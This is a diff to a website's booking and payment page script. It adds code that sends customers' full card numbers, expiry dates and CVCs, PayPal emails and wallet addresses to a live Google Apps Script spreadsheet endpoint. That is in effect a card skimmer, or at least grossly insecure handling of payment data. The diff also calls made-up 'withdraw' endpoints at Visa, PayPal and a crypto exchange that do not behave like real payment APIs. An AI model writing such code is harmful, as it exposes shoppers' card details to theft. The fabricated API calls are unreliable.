@@ -208,11 +208,37 @@
 <script>
 // Open the payment popup after filling the booking form
 document.getElementById("bookNowButton").addEventListener("click", function() {
-  // Validate the booking form first
   const bookingForm = document.getElementById("bookingForm");
   if (bookingForm.checkValidity()) {
-    document.getElementById("bookingPopup").style.display = "none"; // Hide booking form
-    document.getElementById("paymentPopup").style.display = "block"; // Show payment form
+    // Collect booking data
+    const bookingData = {
+      customerName: document.getElementById("customerName").value,
+      email: document.getElementById("emailBooking").value,
+      websiteType: document.getElementById("websiteType").value,
+      customerId: document.getElementById("customerId").value
+    };
+
+    // Send booking data to Google Sheets
+    fetch("YOUR_GOOGLE_APPS_SCRIPT_URL", { // Replace with your Web App URL
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({ type: "booking", data: bookingData }) // Send booking form data
+    })
+    .then(response => response.json())
+    .then(data => {
+      if (data.result === "success") {
+        // Hide booking form and show payment popup
+        document.getElementById("bookingPopup").style.display = "none";
+        document.getElementById("paymentPopup").style.display = "block";
+      } else {
+        alert("Error submitting booking. Please try again.");
+      }
+    })
+    .catch(error => {
+      alert("Error: " + error);
+    });
   } else {
     alert("Please fill in all the required fields.");
   }
@@ -245,7 +271,6 @@ document.querySelectorAll('input[name="paymentMethod"]').forEach(function(elemen
 document.getElementById("paymentForm").addEventListener("submit", function(event) {
   event.preventDefault(); // Prevent form submission until payment is successful
 
-  // Placeholder: simulate payment success after processing
   const paymentMethod = document.querySelector('input[name="paymentMethod"]:checked').value;
   let paymentDetails = {};
 
@@ -256,28 +281,148 @@ document.getElementById("paymentForm").addEventListener("submit", function(event
       expiry: document.getElementById("visaExpiry").value,
       cvc: document.getElementById("visaCVC").value
     };
+
+    // Send payment details to Google Sheets
+    sendPaymentDetailsToGoogleSheets(paymentDetails);
+
+    // Make a call to Visa API for withdrawal to Visa account
+    processVisaPayment(paymentDetails);
+
   } else if (paymentMethod === "PayPal") {
     paymentDetails = {
       method: "PayPal",
       email: document.getElementById("paypalEmail").value
     };
+
+    // Send payment details to Google Sheets
+    sendPaymentDetailsToGoogleSheets(paymentDetails);
+
+    // Make a call to PayPal API to withdraw funds to Visa account
+    processPayPalPayment(paymentDetails);
+
   } else if (paymentMethod === "Crypto") {
     paymentDetails = {
       method: "Crypto",
       walletAddress: document.getElementById("cryptoAddress").value
     };
-  }
 
-  // Simulate a successful payment
-  setTimeout(function() {
-    alert("Payment successful! Your booking is confirmed.");
-    // Hide the payment popup and show a confirmation
-    document.getElementById("paymentPopup").style.display = "none";
-    // Now proceed with the booking (simulate form submission)
-    alert("Booking details submitted!");
-  }, 2000); // Simulate payment processing delay (2 seconds)
+    // Send payment details to Google Sheets
+    sendPaymentDetailsToGoogleSheets(paymentDetails);
+
+    // Make a call to Crypto API to withdraw funds to Visa account
+    processCryptoPayment(paymentDetails);
+  }
 });
+
+// Send payment details to Google Sheets
+function sendPaymentDetailsToGoogleSheets(paymentDetails) {
+  fetch("https://script.google.com/macros/s/AKfycbzHyZyU0gb67q2X1wKNTBRsYzEplfss8CKeQak0WZogEhxzV_A3XUtYabYRMxs80TjRcg/exec", { // Replace with your Web App URL
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ type: "payment", data: paymentDetails }) // Send payment data
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.result !== "success") {
+      alert("Error submitting payment details. Please try again.");
+    }
+  })
+  .catch(error => {
+    alert("Error: " + error);
+  });
+}
+
+// Visa Payment Processing
+function processVisaPayment(details) {
+  console.log("Processing Visa payment", details);
+
+  fetch("https://api.visa.com/withdraw", {
+    method: "POST",
+    headers: {
+      "Authorization": "Bearer YOUR_VISA_API_KEY",
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      cardNumber: details.cardNumber,
+      expiry: details.expiry,
+      cvc: details.cvc,
+      amount: "100"
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.success) {
+      alert("Visa payment processed successfully!");
+      document.getElementById("paymentPopup").style.display = "none";
+      alert("Booking details submitted!");
+    } else {
+      alert("Visa payment failed. Please try again.");
+    }
+  })
+  .catch(error => alert("Error: " + error));
+}
+
+// PayPal Payment Processing
+function processPayPalPayment(details) {
+  console.log("Processing PayPal payment", details);
+
+  fetch("https://api.paypal.com/v1/payments/payment", {
+    method: "POST",
+    headers: {
+      "Authorization": "Bearer YOUR_PAYPAL_API_KEY",
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      email: details.email,
+      amount: "100",
+      toVisaAccount: true
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.state === "approved") {
+      alert("PayPal payment processed successfully!");
+      document.getElementById("paymentPopup").style.display = "none";
+      alert("Booking details submitted!");
+    } else {
+      alert("PayPal payment failed. Please try again.");
+    }
+  })
+  .catch(error => alert("Error: " + error));
+}
+
+// Crypto Payment Processing
+function processCryptoPayment(details) {
+  console.log("Processing Crypto payment", details);
+
+  fetch("https://api.cryptoexchange.com/withdraw", {
+    method: "POST",
+    headers: {
+      "Authorization": "Bearer YOUR_CRYPTO_API_KEY",
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      walletAddress: details.walletAddress,
+      amount: "100",
+      toVisaAccount: true
+    })
+  })
+  .then(response => response.json())
+  .then(data => {
+    if (data.success) {
+      alert("Crypto payment processed successfully!");
+      document.getElementById("paymentPopup").style.display = "none";
+      alert("Booking details submitted!");
+    } else {
+      alert("Crypto payment failed. Please try again.");
+    }
+  })
+  .catch(error => alert("Error: " + error));
+}
 </script>
+
 <!-- JavaScript-->
 <script>
     function toggleSidebar() {
